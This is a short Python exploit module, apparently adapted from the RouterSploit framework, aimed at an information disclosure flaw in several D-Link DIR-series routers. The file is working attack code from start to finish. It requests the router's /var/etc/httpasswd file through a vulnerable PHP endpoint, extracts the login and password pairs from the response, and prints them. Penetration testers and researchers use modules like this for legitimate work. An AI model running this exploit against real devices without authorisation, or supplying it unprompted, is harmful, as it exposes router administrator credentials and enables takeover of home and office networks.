# rsf exploit module
# description: Module exploits information disclosure vulnerability in D-Link DIR-300, DIR-320, DIR-600, DIR-615 devices.

import requests
import re

class Exploit:
    __info__ = {
        "name": "D-Link DIR-300 & DIR-320 & DIR-600 Info Disclosure",
        "description": "Module exploits information disclosure vulnerability in D-Link DIR-300, DIR-320, DIR-600, DIR-615 devices.",
        "authors": (
            "tytusromekiatomek <tytusromekiatomek[at]inbox.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://seclists.org/bugtraq/2013/Dec/11",
        ),
        "devices": (
            "D-Link DIR-300 (all)",
            "D-Link DIR-320 (all)",
            "D-Link DIR-600 (all)",
            "D-Link DIR-615 (fw 4.0)",
        ),
    }

    def __init__(self, target):
        self.target = target
        self.port = 80

    def run(self):
        response = self.http_request()
        if response:
            creds = re.findall("\n\t\t\t(.+?):(.+?)(?:\n\n\t\t\t|\nuser)", response)
            if creds:
                print("Credentials found!")
                for cred in creds:
                    print(f"Login: {cred[0]}, Password: {cred[1]}")
            else:
                print("Credentials could not be found")
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def http_request(self):
        try:
            response = requests.get(f"{self.target}/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd")
            if response.status_code == 200:
                return response.text
        except Exception as e:
            print(f"Error: {e}")
        return None

